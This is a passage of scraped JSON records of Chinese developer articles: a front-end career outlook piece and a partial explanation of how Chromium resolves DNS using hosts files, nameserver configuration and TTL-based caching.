href=\"https://zhuanlan.zhihu.com/juejinfanyi\"\u003e知乎专栏\u003c/a\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514894525.7301","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e91d"},"id":"5a474c8ff265da430a50ea57","author":{"$oid":"5a4b765a751bf823c002e914"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/30/160a684dc845a4ba?w=1322\u0026h=852\u0026f=png\u0026s=956828","https://user-gold-cdn.xitu.io/2017/12/30/160a685202594524?w=1940\u0026h=1454\u0026f=png\u0026s=1969823","https://user-gold-cdn.xitu.io/2017/12/30/160a68588f0ff958?w=2006\u0026h=898\u0026f=png\u0026s=2222573","https://user-gold-cdn.xitu.io/2017/12/30/160a685d06e3a69d?w=1552\u0026h=1246\u0026f=png\u0026s=1877819"],"screenShot":null}],"title":"未来的前端工程师","meta":{"likeCount":0},"tag":["前端","产品","人工智能","React.js"],"comment":[],"shortContent":"前端工程师首先是个程序员，其次也是个软件工程师，他们工作在离用户最近的地方，负责人机交互和用户体验，虽然叫“前端”，但其实他们的工作边界其实已经很宽了。展望未来，我想前端的工作会继续分化，也会继续融合，分工是工业革命以来社会高效协作的主要推动力，以后很长一段时间应该也会维持这种…","content":"\u003cblockquote\u003e\n\u003cp\u003e作者简介：aoto 蚂蚁金服数据前端\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e以下我说的都是个人观点，比较宏观粗浅，主要针对的是前端工程师本身，没有深入技术和业务细节，请谨慎参考。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e职能概览\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a684dc845a4ba?w=1322\u0026amp;h=852\u0026amp;f=png\u0026amp;s=956828\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e前端工程师首先是个\u003cstrong\u003e程序员\u003c/strong\u003e，其次也是个\u003cstrong\u003e软件工程师\u003c/strong\u003e，他们工作在离用户最近的地方，负责人机交互和用户体验，虽然叫“前端”，但其实他们的工作边界其实已经很宽了。展望未来，我想前端的工作会继续分化，也会继续融合，分工是工业革命以来社会高效协作的主要推动力，以后很长一段时间应该也会维持这种形态，融合的原始推动力也是提高效率。分化和融合是不断的演化和互吸收转化的，不过核心的东西我想还是不会有太大变化。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e观点\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e继续分化（领域、行业、技术栈）\u003c/li\u003e\n\u003cli\u003e继续融合（端技术、Web全栈技术、人工智能与端技术）\u003c/li\u003e\n\u003cli\u003e核心不变（计算机科学本质、软件工程思想与实践、程序员职业素养）\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a685202594524?w=1940\u0026amp;h=1454\u0026amp;f=png\u0026amp;s=1969823\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1. 继续分化\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e领域\u003c/h4\u003e\n\u003cp\u003e前端领域会继续分化，例如阿里内部的前端就已经有中后台、图形、端技术、泛Node、开发者服务5个大方向了，每个大方向也会细分，举一些例子：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e中后台：有云控制台、信息\u0026amp;资产管理平台、内部研发\u0026amp;项目管理平台、人工智能\u0026amp;机器学习平台、数据研发分析平台，企业内部信息平台等。具体产品如阿里云控制台、ERP、PAI、DeepInsight、阿里内外、Basecamp等。\u003c/li\u003e\n\u003cli\u003e图形：有基础图形库、3D图形、数据可视化、流程图等。具体产品如G2、DataV、阿里云城市大脑、滴滴智能交通调度图、双十一大屏等。\u003c/li\u003e\n\u003cli\u003e端技术：有移动端（iOS、Android、MobileWeb、PWA、小程序）、PC端（客户端、Web端）、触屏电脑、各种监控大屏、智能手表手环，智能汽车\u0026amp;家居屏幕等。具体产品如淘宝支付宝的App、PC主站、移动H5站，阿里郎、VS Code、双十一大屏、UC浏览器UWP版本、各种智能手表、手环、汽车、家居屏幕等。\u003c/li\u003e\n\u003cli\u003e泛Node：有工具链、Web框架、IoT、客户端（Electron、NW）等。具体产品如DEF/Atool/F2E-Test（阿里前端开发者工具）、Egg.js、阿里云的IoT应用、VS Code等。\u003c/li\u003e\n\u003cli\u003e开发者服务：有应用开发运维平台、组件市场等。具体产品如阿里云的应用搭建平台Boat、Fusion-Design组件市场，支付宝小程序开发者工具等。\u003c/li\u003e\n\u003cli\u003e...\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e行业\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e2B\n\u003cul\u003e\n\u003cli\u003e信息管理、财务、建筑、航天、水利、金融、制造等传统行业软件以及阿里提出的五新：新零售，新制造，新金融，新技术和新能源，新技术赋能传统行业\u003c/li\u003e\n\u003cli\u003eSAAS软件及服务：如Teambition、Trello、钉钉企业版、Basecamp、Growing.io\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e2C\n\u003cul\u003e\n\u003cli\u003e移动App：如微信、微博\u003c/li\u003e\n\u003cli\u003ePC工具应用：如Google Doc\u003c/li\u003e\n\u003cli\u003e产品展示类网站：如阿里云、支付宝官网\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e...\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e技术栈\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eReact（Native）\u003c/li\u003e\n\u003cli\u003eAngular（NativeScript）\u003c/li\u003e\n\u003cli\u003eVue（Weex）\u003c/li\u003e\n\u003cli\u003e...\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e2. 继续融合\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e端技术\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e前端、客户端技术思想的融合\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e组件化（组件化搭建页面）\u003c/li\u003e\n\u003cli\u003e组件生命周期钩子函数（如iOS ViewController）\u003c/li\u003e\n\u003cli\u003eMV*（如MVVM设计就来源于微软客户端开发框架）\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e大前端的统一\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e虚拟DOM技术：React/ReactNative/ReactCanvas\u003c/li\u003e\n\u003cli\u003e各种移动设备内核和引擎的统一：WebKit/V8\u003c/li\u003e\n\u003cli\u003eWeb技术文档的统一：Mozilla Web Docs\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003eWeb全栈技术\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e前端、后端技术思想的融合\n\u003cul\u003e\n\u003cli\u003eMV*（如前端的第一个MVC框架Backbone.js就来自于Ruby on Rails开发者）\u003c/li\u003e\n\u003cli\u003eAOP、依赖注入（Angular）\u003c/li\u003e\n\u003cli\u003eGraphQL（SQL）\u003c/li\u003e\n\u003cli\u003eIndexedDB（Database）\u003c/li\u003e\n\u003cli\u003e...\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e人工智能与端技术\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e人工智能、前端技术的融合\n\u003cul\u003e\n\u003cli\u003e端是最终触达用户的节点\u003c/li\u003e\n\u003cli\u003e端数据采集-\u0026gt;后端机器学习、数据分析-\u0026gt;智能推荐呈现\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e物联网、前端技术的融合\n\u003cul\u003e\n\u003cli\u003e智能家居/汽车/工业设备可能是有屏幕的，同时可以基于如\u003ca target=\"_blank\" href=\"https://github.com/jerryscript-project/jerryscript\"\u003eJerryScript\u003c/a\u003e这样的JS执行引擎使用Node.js开发联网应用\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e3. 核心不变\u003c/h3\u003e\n\u003cp\u003e也就是计算机科学本质/软件工程思想与实践/程序员职业素养。这个就不是一段文字可以涵盖的了，这里不做详细论述。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e历史回顾\u003c/h2\u003e\n\u003cp\u003e回顾过前端的演化，主要参见最底下的相关资源，下图简要回顾一下95年以来软件开发和前端历史：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a68588f0ff958?w=2006\u0026amp;h=898\u0026amp;f=png\u0026amp;s=2222573\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前端的未来\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e那些生存空间越来越小的产业\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e有一些切分体会\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e小规模移动App：移动App市场被一些巨头把持，小规模App生存空间越来越小\u003c/li\u003e\n\u003cli\u003ePC信息导航类网站（网址、购物、论坛、生活）：现在移动优先，而且有智能推荐，并且是强社交\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e无界面交互\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWeb前端能做一些事，主要是大前端的范畴\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e会话式界面（视频语音会话、语音搜索：WebRTC，开源语音库：\u003ca target=\"_blank\" href=\"https://voice.mozilla.org/\"\u003eCommon Voice\u003c/a\u003e）\u003c/li\u003e\n\u003cli\u003e感官式界面（视觉：WebAR/WebVR）\u003c/li\u003e\n\u003cli\u003e无界面，未来会有大量IoT设备（IoT有自己的通信协议和规范，前端的工作是在用户看不见的后台）\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e富界面交互\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e大量工作需要前端来做\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e日常办公软件（复杂应用，并且慢慢从桌面程序演化为Web）：Office、Email、文档管理、产品设计、项目管理、代码编辑器\u003c/li\u003e\n\u003cli\u003e大数据/AI配套软件（复杂应用，并且慢慢从桌面程序演化为Web）：需要大量的后台系统来做数据分析/机器学习\u003c/li\u003e\n\u003cli\u003e播放器/游戏：H5代替Flash，如Web Audio、Web Video、Canvas\u003c/li\u003e\n\u003cli\u003e容器/DSL/内核/小程序：支付宝/微信/钉钉容器，内核（也就是UC、QQ浏览器内核），及其自定义DSL（如果将来手机的底层能力都可以上浮到小程序，很有想象空间）\u003c/li\u003e\n\u003cli\u003e产品信息展示类网站（炫酷应用）：各种智能设备官网、大企业官网\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e未来在哪里\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a685d06e3a69d?w=1552\u0026amp;h=1246\u0026amp;f=png\u0026amp;s=1877819\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e回顾观点\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e继续分化（领域细分、行业细分、技术栈细分）\u003c/li\u003e\n\u003cli\u003e继续融合（端技术融合、Web全栈、人工智能与端技术的融合）\u003c/li\u003e\n\u003cli\u003e核心不变（计算机科学本质、软件工程思想与实践、程序员职业素养）\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003e一些建议\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e关心人工智能的发展，思考TA在前端领域可能产生的应用场景\n\u003cul\u003e\n\u003cli\u003e视觉稿自动生成代码\u003c/li\u003e\n\u003cli\u003e根据用户使用习惯自动排出最符合该用户习惯的界面\u003c/li\u003e\n\u003cli\u003e收集用户数据在前端实时做学习和分析，如\u003ca target=\"_blank\" href=\"https://deeplearnjs.org/\"\u003edeeplearn.js\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e...\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e相信前端的未来，Web的力量\n\u003cul\u003e\n\u003cli\u003eWebKit\u003c/li\u003e\n\u003cli\u003eV8\u003c/li\u003e\n\u003cli\u003eFlexbox：\u003ca target=\"_blank\" href=\"https://facebook.github.io/yoga/\"\u003eYoga\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e...\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e结合公司业务特点有重点的关注前端的某些方面，毕竟技术服务于业务\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003cp\u003e以上都是个人观点。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e相关资源\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eWeb开发这十年：http://www.infoq.com/cn/articles/web-development-ten-years\u003c/li\u003e\n\u003cli\u003eGUI应用架构十年变迁：https://segmentfault.com/a/1190000006016817\u003c/li\u003e\n\u003cli\u003e大话前端时代一：https://halfrost.com/vue_ios_modularization/\u003c/li\u003e\n\u003cli\u003e写给初学前端工程师的一封信：https://zhuanlan.zhihu.com/p/28536429\u003c/li\u003e\n\u003cli\u003e母鸡与前端工程师：http://www.ruanyifeng.com/blog/2016/07/hen-and-front-end-engineer.html\u003c/li\u003e\n\u003cli\u003e李开复人工智能预言：http://tech.sina.com.cn/it/2017-05-20/doc-ifyfkqks4361454.shtml\u003c/li\u003e\n\u003cli\u003e《无界面交互》：https://book.douban.com/subject/26947799/\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e后记：前端的发展超出了所有人的想象力，未来肯定是难以预测的，也没有做预测的必要，我们要做的还是踏实做好眼前的事情，“过往不恋、当下不杂、未来不迎”，与君共勉！\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e对我们团队感兴趣的可以关注专栏或者发送简历至'tao.qit####alibaba-inc.com'.replace('####', '@')，欢迎有志之士加入~\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e原文地址：\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a474c8ff265da430a50ea57\"\u003ehttps://juejin.im/post/5a474c8ff265da430a50ea57\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514894767.0542","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e91f"},"id":"5a4a2f00f265da431e171da4","author":{"$oid":"5a4b765a751bf823c002e908"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"从Chrome源码看DNS解析过程","meta":{"likeCount":0},"tag":["前端","Chrome","DNS"],"comment":[],"shortContent":"DNS解析的作用是把域名解析成相应的IP地址，因为在广域网上路由器需要知道IP地址才知道把报文发给谁。DNS是Domain Name System域名系统的缩写，它是一个协议，在RFC 1035具体描述了这个协议。具体过程如下图所示： 其实域名解析和Chrome没有直接关系，即…","content":"\u003cp\u003eDNS解析的作用是把域名解析成相应的IP地址，因为在广域网上路由器需要知道IP地址才知道把报文发给谁。DNS是Domain Name System域名系统的缩写，它是一个协议，在\u003ca href=\"https://www.ietf.org/rfc/rfc1035.txt\"\u003eRFC 1035\u003c/a\u003e具体描述了这个协议。具体过程如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7ba6ea9b9a?w=2020\u0026amp;h=782\u0026amp;f=png\u0026amp;s=23552\"\u003e\u003c/p\u003e\u003cp\u003e这个过程看似简单，但是有几个问题：\u003c/p\u003e\u003cp\u003e（1）浏览器是怎么知道DNS解析服务器，如上图的8.8.8.8这台？\u003c/p\u003e\u003cp\u003e（2）一个域名可以解析成多个IP地址吗，如果只有一个IP地址，在并发量很大的情况下，那台服务器可能会爆？\u003c/p\u003e\u003cp\u003e（3）把域名绑了host之后，是不是就不用域名解析了直接用的本地host指定的IP地址？\u003c/p\u003e\u003cp\u003e（4）域名解析的有效时间为多长，即过了多久后同一个域名需要再次进行解析？\u003c/p\u003e\u003cp\u003e（5）什么是域名解析的A记录、AAAA记录、CNAME记录？\u003c/p\u003e\u003cp\u003e其实域名解析和Chrome没有直接关系，即使是最简单的curl命令也需要进行域名解析，但是我们可以通过Chrome源码来看一下这个过程是怎么样的，并且回答上面的问题。\u003c/p\u003e\u003cp\u003e首先第一个问题，浏览器是怎么知道DNS解析服务器的，在本机的网络设置里面可以看到当前的DNS服务器IP，如我电脑的：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7ba762ace5?w=1208\u0026amp;h=316\u0026amp;f=png\u0026amp;s=13160\"\u003e\u003c/p\u003e\u003cp\u003e这两个DNS Server是我家接的某正宽带提供的：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7ba6c1a084?w=588\u0026amp;h=126\u0026amp;f=png\u0026amp;s=6972\"\u003e\u003c/p\u003e\u003cp\u003e一般宽带服务商都会提供DNS服务器，谷歌还为公众提供了两个免费的DNS服务，分别为8.8.8.8和8.8.4.4，取这两个IP地址是为了容易记住，当你的DNS服务不好用的时候，可以尝试改成这两个。\u003c/p\u003e\u003cp\u003e入网的设备是怎么获取到这些IP地址的呢？是通过动态主机配置协议(DHCP)，当一台设备连到路由器之后，路由器通过DHCP给它分配一个IP地址，并告诉它DNS服务器，如下路由器的DHCP设置：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7ba6edaef1?w=720\u0026amp;h=308\u0026amp;f=png\u0026amp;s=65311\"\u003e\u003c/p\u003e\u003cp\u003e通过wireshark抓包可以观察到这个过程：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7ba6d97369?w=1428\u0026amp;h=628\u0026amp;f=png\u0026amp;s=58357\"\u003e\u003c/p\u003e\u003cp\u003e当我的电脑连上wifi的时候，会发一个DHCP Request的广播，路由器收到这个广播后就会向我的电脑分配一个IP地址并告知DNS服务器。\u003c/p\u003e\u003cp\u003e这个时候系统就有DNS服务器了，Chrome是调\u003ca href=\"http://man7.org/linux/man-pages/man3/resolver.3.html\"\u003eres_ninit\u003c/a\u003e这个系统函数(Linux)去获取系统的DNS服务器，这个函数是通过读取/etc/resolver.conf这个文件获取DNS：\u003c/p\u003e\u003cpre code-lang=\"bash\" class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Mac OS X Notice\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# This file is not used by the host name and address resolution\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# or the DNS query routing mechanisms used by most processes on\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# this Mac OS X system.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# This file is automatically generated.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\nsearch DHCP HOST\nnameserver 59.108.61.61\nnameserver 219.232.48.61\u003c/code\u003e\u003c/pre\u003e\u003cp\u003esearch选项的作用是当一个域名不可解析时，就会尝试在后面添加相应的后缀，如ping hello，无法解析就会分别ping hello.DHCP/hello.HOST，结果最后都无法解析。\u003c/p\u003e\u003cp\u003eChrome在启动的时候根据不同的操作系统去获取DNS服务器配置，然后把它放到DNSConfig的nameservers：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e  \u003cspan class=\"hljs-comment\"\u003e// List of name server addresses.\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003estd\u003c/span\u003e::\u003cspan class=\"hljs-built_in\"\u003evector\u003c/span\u003e\u0026lt;IPEndPoint\u0026gt; nameservers;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eChrome还会监听网络变化同步改变配置。\u003c/p\u003e\u003cp\u003e然后用这个nameservers列表去初始化一个socket pool即套接字池，套接字是用来发请求的。在需要做域名解析的时候会从套接字池里面取出一个socket，并传递想要用的server_index，初始化的时候是0，即取第一个DNS服务IP地址，一旦解析请求两次都失败了，则server_index + 1使用下一个DNS服务。\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e    \u003cspan class=\"hljs-keyword\"\u003eunsigned\u003c/span\u003e server_index =\n        (first_server_index_ + attempt_number) % config.nameservers.size();\n    \u003cspan class=\"hljs-comment\"\u003e// Skip over known failed servers.\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 最大attempts数为2，在构造DnsConfig设定的\u003c/span\u003e\n    server_index = session_-\u0026gt;NextGoodServerIndex(server_index);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果所有的nameserver都失败了，那么它会取最早失败的nameserver.\u003c/p\u003e\u003cp\u003eChrome在启动的时候除了会读取DNS server之外，还会去取读取和解析hosts文件，放到DNSConfig的hosts属性里面，它是一个哈希map：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-comment\"\u003e// Parsed results of a Hosts file.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// Although Hosts files map IP address to a list of domain names, for name\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// resolution the desired mapping direction is: domain name to IP address.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// When parsing Hosts, we apply the \"first hit\" rule as Windows and glibc do.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// With a Hosts file of:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 300.300.300.300 localhost # bad ip\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 127.0.0.1 localhost\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 10.0.0.1 localhost\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// The expected resolution of localhost is 127.0.0.1.\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eusing\u003c/span\u003e DnsHosts = \u003cspan class=\"hljs-built_in\"\u003estd\u003c/span\u003e::\u003cspan class=\"hljs-built_in\"\u003eunordered_map\u003c/span\u003e\u0026lt;DnsHostsKey, IPAddress, DnsHostsKeyHash\u0026gt;;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ehosts文件在linux系统上是在/etc/hosts：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e base::FilePath::CharType kFilePathHosts[] =\n    FILE_PATH_LITERAL(\u003cspan class=\"hljs-string\"\u003e\"/etc/hosts\"\u003c/span\u003e);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e读取这个文件没有什么技巧，需要一行行地去处理，并做一些非法情况的判断，如上面代码的注释。\u003c/p\u003e\u003cp\u003e这样DNSConfig里面就有两个配置了，一个是hosts，另一个是nameservers，DNSConfig是组合到DNSSession，它们的组合关系如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1c7ba75fa41a?w=1278\u0026amp;h=1150\u0026amp;f=png\u0026amp;s=29993\"\u003e\u003c/p\u003e\u003cp\u003eresolver是负责解析的驱动类，它组合了一个client，client创建一个session，session层有一个很大的作用是用来管理server_index和socket pool如分配socket等，session初始化config，config用来读取本地绑的hosts和nameservers两个配置。这几层各有各的职责。\u003c/p\u003e\u003cp\u003eresolver有一个重要的功能，它组合了一个job，用来创建任务队列。resolver还组合了一个Hostcache，它是放解析结果的缓存，如果缓存缓存命中的话，就不用去解析了，这个过程是这样的，外部调rosolver提供的HostResolverImpl::Resolve接口，这个接口会先判断在本地是否能处理：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e  \u003cspan class=\"hljs-keyword\"\u003eint\u003c/span\u003e net_error = ERR_UNEXPECTED;\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (ServeFromCache(*key, info, \u0026amp;net_error, addresses, allow_stale,\n                     stale_info)) {\n    source_net_log.AddEvent(NetLogEventType::HOST_RESOLVER_IMPL_CACHE_HIT,\n                            addresses-\u0026gt;CreateNetLogCallback());\n    \u003cspan class=\"hljs-comment\"\u003e// |ServeFromCache()| will set |*stale_info| as needed.\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e net_error;\n  }\n\n  \u003cspan class=\"hljs-comment\"\u003e// TODO(szym): Do not do this if nsswitch.conf instructs not to.\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// http://crbug.com/117655\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (ServeFromHosts(*key, info, addresses)) {\n    source_net_log.AddEvent(NetLogEventType::HOST_RESOLVER_IMPL_HOSTS_HIT,\n                            addresses-\u0026gt;CreateNetLogCallback());\n    MakeNotStale(stale_info);\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e OK;\n  }\n\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e ERR_DNS_CACHE_MISS;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面代码先调serveFromCache去cache里面看有没有，如果cache命中的话则返回，否则看hosts是否命中，如果都不命中则返回CACHE_MISS的标志位。如果返回值不等于CACHE_MISS，则直接返回：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (rv != ERR_DNS_CACHE_MISS) {\n    LogFinishRequest(source_net_log, info, rv);\n    RecordTotalTime(info.is_speculative(), \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e, base::TimeDelta());\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e rv;\n  }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e否则创建一个job，并看是否能立刻执行，如果job队列太多了，则添加到job队列后面，并传递一个成功的回调处理函数。\u003c/p\u003e\u003cp\u003e所以这里和我们的认知基本上是一样的，先看下cache有没有，然后再看hosts有没有，如果没有的话再进行查询。在cache查询的时候如果这个cache已经过时了即staled，也会返回null，而判断是否stale的标准如下：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003ebool\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eis_stale\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e \u003c/span\u003e{\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e network_changes \u0026gt; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e || expired_by \u0026gt;= base::TimeDelta();\n    }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e即网络发生了变化，或者expired_by大于0，则认为是过时的cache。这个时间差是用当前时间减掉当前cache的过期时间：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003estale.expired_by = now - expires_;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e而过期时间是在初始化的时候使用now + ttl的值，而这个ttl是使用上一次请求解析的时候返回的ttl：\u003c/p\u003e\u003cpre code-lang=\"cpp\" class=\"hljs cpp\"\u003e\u003ccode\u003e \u003cspan class=\"hljs-keyword\"\u003euint32_t\u003c/span\u003e ttl_sec = \u003cspan class=\"hljs-built_in\"\u003estd\u003c/span\u003e::numeric_limits\u0026lt;\u003cspan class=\"hljs-keyword\"\u003euint32_t\u003c/span\u003e\u0026gt;::max();\n ttl_sec = \u003cspan class=\"hljs-built_in\"\u003estd\u003c/span\u003e::min(ttl_sec, record.ttl);\n *ttl = base::TimeDelta::FromSeconds(ttl_sec);\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面代码做了一个防溢出处理。在wireshark的dns response可以直观地看到这个ttl：\u003c/p\u003e\u003cp\u003e\u003cimg alt=\"\" 